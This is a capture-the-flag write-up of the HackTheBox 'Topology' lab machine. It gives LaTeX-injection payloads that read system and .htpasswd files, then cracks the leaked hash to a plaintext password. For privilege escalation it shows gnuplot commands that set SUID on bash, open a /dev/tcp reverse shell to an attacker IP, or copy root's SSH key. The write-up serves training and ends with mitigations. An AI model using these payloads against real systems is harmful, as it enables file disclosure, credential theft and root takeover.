---
title: "Topology - HackTheBox"
description: "Writeup of the Topology machine from HackTheBox, an easy Linux machine involving LaTeX injection and .htpasswd file exploitation."
pubDate: 2024-11-02
platform: "htb"
category: "machines"
difficulty: "easy"
os: "linux"
language: en
tags: ["latex", "latex-injection", "htpasswd", "gnuplot", "lfi"]
retired: false
logo: "/images/writeups/htb/topology/logo.png"
heroImage: "/images/writeups/htb/topology/card.png"
attackVectors: ["web"]
techniques: ["T1190", "T1552.001", "T1068"]
vulnerabilities: ["latex-injection", "weak-credentials"]
certifications: ["OSCP", "eJPT"]
skillLevel: "beginner"
estimatedTime: "2-3 hours"
points: 20
rating: 4.1
---

# Topology - HackTheBox Writeup

**Difficulty**: Easy  
**OS**: Linux  
**Platform**: HackTheBox  
**IP**: 10.10.11.217

## Introduction

Topology is an easy Linux machine featuring a LaTeX equation generator vulnerable to LaTeX code injection. Through this vulnerability, we'll read system files, obtaining credentials from an .htpasswd file. Subsequently, we'll escalate privileges by exploiting write permissions on gnuplot files.

## Reconnaissance

### Port Scanning

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.217 -oG allPorts
```

**Open ports:**
- 22/tcp - SSH
- 80/tcp - HTTP

### Service Scanning

```bash
nmap -p22,80 -sCV 10.10.11.217 -oN targeted
```

**Results:**
- **22/tcp** - OpenSSH 8.2p1 Ubuntu
- **80/tcp** - Apache httpd 2.4.41

## Web Enumeration

### Main Website

Accessing `http://10.10.11.217`, we find a mathematics website for "Miskatonic University".

### Subdomain Enumeration

```bash
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.topology.htb" -u http://10.10.11.217 --hh 6767
```

**Subdomains found:**
- latex.topology.htb
- dev.topology.htb
- stats.topology.htb

Add to `/etc/hosts`:

```bash
echo "10.10.11.217 topology.htb latex.topology.htb dev.topology.htb stats.topology.htb" | sudo tee -a /etc/hosts
```

### LaTeX Equation Generator

At `http://latex.topology.htb`, we find a LaTeX equation generator that converts LaTeX code into PNG images.

### Protected Subdomains

- **dev.topology.htb**: Protected with HTTP Basic authentication
- **stats.topology.htb**: Protected with HTTP Basic authentication

## Exploitation

### LaTeX Injection

The equation generator is vulnerable to **LaTeX Injection**. LaTeX has commands that allow reading system files.

### Useful LaTeX Commands

```latex
\input{/etc/passwd}          # Read files (filtered)
\lstinputlisting{/etc/passwd} # Read files (filtered)
\include{/etc/passwd}         # Read files (filtered)
```

These commands are filtered, but we can use others:

```latex
$\lstinputlisting{/etc/passwd}$
```

### Filter Bypass

We try different commands:

```latex
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\closein\file
```

This method is also filtered. We try:

```latex
$\input{/etc/passwd}$
```

### Successful File Reading

Finally, we find we can read files using:

```latex
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```

or simpler:

```latex
\lstinputlisting{/var/www/dev/.htpasswd}
```

However, the most effective method is:

```latex
\input{|"cat /etc/passwd"}
```

This is blocked by LaTeX configuration. We try another approach.

### Web File Enumeration

We know dev.topology.htb is protected. .htpasswd files are typically in:
- /var/www/dev/.htpasswd
- /var/www/html/.htpasswd

### Final Payload

```latex
$\lstinputlisting{/var/www/dev/.htpasswd}$
```

or using escape with newline:

```latex
$\newread\file\openin\file=/var/www/dev/.htpasswd\read\file to \line\text{\line}\closein\file$
```

### Alternative Method - Direct File Inclusion

The working payload:

```latex
\newread\file
\openin\file=/var/www/dev/.htpasswd
\read\file to\line
\text{\line}
\closein\file
```

**Result:**
```
vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
```

### Hash Cracking

```bash
echo 'vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0' > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

or with hashcat:

```bash
hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
```

**Cracked password:** calculus20

### SSH as vdaisley

```bash
ssh vdaisley@10.10.11.217
# Password: calculus20
```

**User flag:**
```bash
cat /home/vdaisley/user.txt
```

## Privilege Escalation

### System Enumeration

```bash
find / -perm -4000 2>/dev/null
sudo -l
id
```

### File Enumeration

```bash
ls -la /opt
```

We find `/opt/gnuplot`.

### Monitoring with pspy

```bash
# Download pspy
wget http://10.10.14.5:8000/pspy64
chmod +x pspy64
./pspy64
```

We observe that root executes gnuplot scripts periodically.

### gnuplot Analysis

```bash
ls -la /opt/gnuplot/
```

We find several `.plt` files which are gnuplot scripts. Check permissions:

```bash
find /opt/gnuplot -type f -writable 2>/dev/null
```

### Writable Files

We find we have write permissions on some .plt files.

### gnuplot Exploitation

Gnuplot can execute system commands using `system()`.

Create a malicious script:

```bash
echo 'system("chmod u+s /bin/bash")' > /opt/gnuplot/loadplot.plt
```

or for a reverse shell:

```bash
echo 'system("bash -c \"bash -i >& /dev/tcp/10.10.14.5/443 0>&1\"")' > /opt/gnuplot/loadplot.plt
```

### Wait for Execution

Wait for the cron job to execute the script (usually every minute).

### Root Shell

```bash
/bin/bash -p
```

**Root flag:**
```bash
cat /root/root.txt
```

### Alternative Method - SSH Key

```bash
echo 'system("cp /root/.ssh/id_rsa /tmp/root_key && chmod 777 /tmp/root_key")' > /opt/gnuplot/loadplot.plt
```

Wait and then:

```bash
cat /tmp/root_key
# Copy the key and use it for SSH
```

## Conclusion

Topology is an excellent machine to learn about:
- LaTeX code injection
- File reading via LaTeX
- Cracking .htpasswd hashes (APR1-MD5)
- Subdomain enumeration
- Exploiting scheduled tasks (cron)
- Manipulating gnuplot configuration files
- Pivoting and privilege escalation techniques

**Lessons Learned:**
- Validate and sanitize user input in LaTeX generators
- LaTeX can be used to read arbitrary files
- .htpasswd files should be outside the document root
- Scripts executed by root should be immutable
- Monitoring processes with pspy is crucial for detecting cron jobs

**Mitigations:**
- Implement sandbox for LaTeX execution
- Disable dangerous LaTeX commands (\input, \include, etc.)
- Use strong passwords and modern hashes
- Configure strict permissions on configuration files
- Don't execute scripts modifiable by unprivileged users
- Implement AppArmor or SELinux to restrict LaTeX
- Validate and sanitize ALL user input
